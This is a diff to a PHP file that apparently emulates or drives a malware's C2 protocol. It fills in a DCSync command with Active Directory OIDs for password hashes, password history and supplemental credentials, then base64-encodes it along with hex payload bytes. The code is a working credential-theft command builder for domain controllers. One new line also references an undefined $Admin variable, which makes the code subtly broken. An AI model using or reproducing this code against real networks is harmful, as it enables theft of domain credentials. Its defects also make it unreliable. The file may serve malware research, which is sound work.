@@ -699,8 +699,8 @@ function port_scan($hostname, $ports)
 
 /*
  	ex: DCSync("admin", "mylab.local");
-  	parameters AA to NN are Object Identifiers in the form "1.2.840.113549.1.1.1"
-   	likely OID values are the ones used in Mimikatz
+  	The command also expects 10 OIDs as well as 4 'sensitives' OID among the ones defined in Mimikatz "kull_m_rpc_drsr_encrypted_oids"
+   	Thos OIDs can only be guessed since those are sent by the C2
 */
 function DCSync($admin_user, $DomainName)
 {
@@ -793,7 +793,26 @@ $p2 = $p2 . "\x8c\x06\x50\x21\x18\x00\x08\x00\x13\xa1\x20\x00\xc6\x06\x70\x00\x2
 	$p1_b64 = base64_encode($p1);
 	$p2_b64 = base64_encode($p2);
 	
-	$cmd_id = "\x81\x98 $p1_b64 $p2_b64 AA BB CC DD EE FF GG HH II JJ KK LL MM NN $admin_user $DomainName";
+	//$szOID_ANSI_name = "1.2.840.113556.1.4.1";
+	$szOID_ANSI_sAMAccountName = "1.2.840.113556.1.4.221";
+	//$szOID_ANSI_userPrincipalName	= "1.2.840.113556.1.4.656";
+	$szOID_ANSI_sAMAccountType = "1.2.840.113556.1.4.302";
+	//$szOID_ANSI_userAccountControl	= "1.2.840.113556.1.4.8";
+	$szOID_ANSI_accountExpires = "1.2.840.113556.1.4.159";
+	$szOID_ANSI_lmPwdHistory = "1.2.840.113556.1.4.160";
+	$szOID_ANSI_unicodePwd	= "1.2.840.113556.1.4.90";
+	$szOID_ANSI_pwdLastSet = "1.2.840.113556.1.4.96";
+	$szOID_ANSI_ntPwdHistory = "1.2.840.113556.1.4.94";
+	$szOID_ANSI_dBCSPwd = "1.2.840.113556.1.4.55";
+	$szOID_ANSI_supplementalCredentials = "1.2.840.113556.1.4.125";
+	$szOID_ANSI_sIDHistory = "1.2.840.113556.1.4.609";
+	$szOID_ANSI_objectSid = "1.2.840.113556.1.4.146";
+	//$szOID_ANSI_trustAuthIncoming = "1.2.840.113556.1.4.129";
+	//$szOID_ANSI_trustAuthOutgoing = "1.2.840.113556.1.4.135";
+	$szOID_ANSI_currentValue = "1.2.840.113556.1.4.27";
+
+	
+	$cmd_id = "\x81\x98 $p1_b64 $p2_b64 $szOID_ANSI_sAMAccountName $szOID_ANSI_sAMAccountType $szOID_ANSI_accountExpires $szOID_ANSI_pwdLastSet $szOID_ANSI_sIDHistory $szOID_ANSI_objectSid $szOID_ANSI_unicodePwd $szOID_ANSI_ntPwdHistory $szOID_ANSI_supplementalCredentials $szOID_ANSI_currentValue $szOID_ANSI_unicodePwd $szOID_ANSI_ntPwdHistory $szOID_ANSI_supplementalCredentials $szOID_ANSI_currentValue $Admin $DomainName";
 	$cmd_id_b64 = base64_encode($cmd_id);
 	
 	return $cmd_id_b64;
